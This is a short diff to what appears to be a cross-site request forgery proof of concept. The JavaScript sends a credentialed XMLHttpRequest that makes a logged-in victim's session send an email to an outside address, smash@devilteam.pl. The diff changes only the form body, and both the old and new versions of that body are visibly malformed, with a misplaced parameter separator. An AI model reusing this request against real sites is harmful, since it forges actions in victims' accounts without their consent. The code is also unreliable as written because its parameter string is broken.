@@ -5,7 +5,7 @@ xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
 xhr.setRequestHeader("X-CSRF", 1);
 xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
 xhr.withCredentials = true;
-var body = "emailTo=smash@devilteam.plemailCc=&emailBcc=&emailSubject=abc&emailBodyText=abcwoot";
+var body = "emailTo=smash@devilteam.plemail&Cc=&emailBcc=&emailSubject=abc&emailBodyText=abcwoot";
 var aBody = new Uint8Array(body.length);
 for (var i = 0; i < aBody.length; i++)
   aBody[i] = body.charCodeAt(i); 
